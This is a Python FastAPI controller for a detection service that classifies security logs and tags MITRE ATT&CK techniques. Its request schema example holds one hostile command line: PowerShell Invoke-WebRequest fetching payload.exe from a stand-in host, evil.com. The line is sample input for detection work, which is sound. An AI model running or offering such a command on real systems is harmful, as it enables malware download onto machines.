"""
Log Analysis Controller - REST API endpoints.
"""
from fastapi import APIRouter, HTTPException, status
from pydantic import BaseModel, Field
from typing import List, Optional
from datetime import datetime
import time

from app.services.ml_service import ml_service
from app.repositories.log_repository import log_repository
from app.models.log_model import LogAnalysis, LogStatus
from loguru import logger


router = APIRouter(prefix="/api/logs", tags=["logs"])


# Request/Response Models
class AnalyzeLogRequest(BaseModel):
    """Request model for log analysis."""
    log_content: str = Field(..., description="Log content to analyze (JSON format)")
    session_id: Optional[str] = Field(None, description="Session ID for tracking")
    
    class Config:
        json_schema_extra = {
            "example": {
                "log_content": '{"EventID": 4688, "Process": "powershell.exe", "CommandLine": "Invoke-WebRequest http://evil.com/payload.exe"}',
                "session_id": "session_123"
            }
        }


class AnalyzeLogResponse(BaseModel):
    """Response model for log analysis."""
    analysis_id: str = Field(..., description="Analysis ID for reference")
    status: str = Field(..., description="Classification status (Normal/Suspicious/Unknown)")
    reason: str = Field(..., description="Explanation for classification")
    mitre_techniques: List[str] = Field(..., description="Detected MITRE ATT&CK techniques")
    raw_output: str = Field(..., description="Raw model output")
    processing_time_ms: float = Field(..., description="Processing time in milliseconds")
    analyzed_at: datetime = Field(..., description="Timestamp of analysis")
    
    class Config:
        json_schema_extra = {
            "example": {
                "analysis_id": "65f1234567890abcdef12345",
                "status": "Suspicious",
                "reason": "PowerShell downloading executable from external site",
                "mitre_techniques": ["T1105"],
                "raw_output": "Status: Suspicious\nReason: ...",
                "processing_time_ms": 1250.5,
                "analyzed_at": "2026-02-24T10:30:00Z"
            }
        }


class HealthResponse(BaseModel):
    """Health check response."""
    status: str
    model_loaded: bool
    timestamp: datetime


class StatsResponse(BaseModel):
    """Statistics response."""
    total_analyses: int
    status_counts: dict
    recent_analyses: List[dict]


# API Endpoints
@router.post("/analyze", response_model=AnalyzeLogResponse, status_code=status.HTTP_201_CREATED)
async def analyze_log(request: AnalyzeLogRequest):
    """
    Analyze a log chunk and detect MITRE ATT&CK techniques.
    
    - **log_content**: Log data in JSON format
    - **session_id**: Optional session ID for tracking multiple analyses
    
    Returns classification status, reasoning, and detected MITRE techniques.
    """
    start_time = time.time()
    
    try:
        # Analyze using ML service
        status_result, reason, mitre_techniques, raw_output, error = await ml_service.analyze_log(
            request.log_content
        )
        
        if error:
            raise HTTPException(
                status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
                detail=f"Analysis failed: {error}"
            )
        
        processing_time_ms = (time.time() - start_time) * 1000
        
        # Save to database
        log_analysis = LogAnalysis(
            log_content=request.log_content,
            status=LogStatus(status_result),
            reason=reason,
            mitre_techniques=mitre_techniques,
            raw_output=raw_output,
            processing_time_ms=processing_time_ms,
            session_id=request.session_id
        )
        
        saved_analysis = await log_repository.create(log_analysis)
        
        logger.info(f"Analysis completed: {status_result} ({processing_time_ms:.2f}ms)")
        
        return AnalyzeLogResponse(
            analysis_id=str(saved_analysis.id),
            status=status_result,
            reason=reason,
            mitre_techniques=mitre_techniques,
            raw_output=raw_output,
            processing_time_ms=processing_time_ms,
            analyzed_at=saved_analysis.analyzed_at
        )
        
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Error in analyze_log endpoint: {str(e)}")
        raise HTTPException(
            status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
            detail=f"Internal server error: {str(e)}"
        )


@router.get("/history/{analysis_id}", response_model=AnalyzeLogResponse)
async def get_analysis(analysis_id: str):
    """
    Retrieve a specific log analysis by ID.
    
    - **analysis_id**: The ID of the analysis to retrieve
    """
    analysis = await log_repository.find_by_id(analysis_id)
    
    if not analysis:
        raise HTTPException(
            status_code=status.HTTP_404_NOT_FOUND,
            detail=f"Analysis {analysis_id} not found"
        )
    
    return AnalyzeLogResponse(
        analysis_id=str(analysis.id),
        status=analysis.status.value,
        reason=analysis.reason,
        mitre_techniques=analysis.mitre_techniques,
        raw_output=analysis.raw_output,
        processing_time_ms=analysis.processing_time_ms or 0,
        analyzed_at=analysis.analyzed_at
    )


@router.get("/session/{session_id}")
async def get_session_analyses(session_id: str, limit: int = 100):
    """
    Retrieve all analyses for a specific session.
    
    - **session_id**: Session ID to filter by
    - **limit**: Maximum number of results (default: 100)
    """
    analyses = await log_repository.find_by_session(session_id, limit)
    
    return {
        "session_id": session_id,
        "count": len(analyses),
        "analyses": [
            {
                "analysis_id": str(a.id),
                "status": a.status.value,
                "mitre_techniques": a.mitre_techniques,
                "analyzed_at": a.analyzed_at
            }
            for a in analyses
        ]
    }


@router.get("/recent", response_model=List[AnalyzeLogResponse])
async def get_recent_analyses(limit: int = 50):
    """
    Retrieve recent log analyses.
    
    - **limit**: Maximum number of results (default: 50)
    """
    analyses = await log_repository.find_recent(limit)
    
    return [
        AnalyzeLogResponse(
            analysis_id=str(a.id),
            status=a.status.value,
            reason=a.reason,
            mitre_techniques=a.mitre_techniques,
            raw_output=a.raw_output,
            processing_time_ms=a.processing_time_ms or 0,
            analyzed_at=a.analyzed_at
        )
        for a in analyses
    ]


@router.get("/stats", response_model=StatsResponse)
async def get_statistics():
    """Get analysis statistics."""
    status_counts = await log_repository.count_by_status()
    recent = await log_repository.find_recent(10)
    
    total = sum(status_counts.values())
    
    return StatsResponse(
        total_analyses=total,
        status_counts=status_counts,
        recent_analyses=[
            {
                "id": str(a.id),
                "status": a.status.value,
                "analyzed_at": a.analyzed_at.isoformat()
            }
            for a in recent
        ]
    )


@router.get("/health", response_model=HealthResponse)
async def health_check():
    """Check API health and model status."""
    return HealthResponse(
        status="healthy",
        model_loaded=ml_service.is_loaded(),
        timestamp=datetime.utcnow()
    )
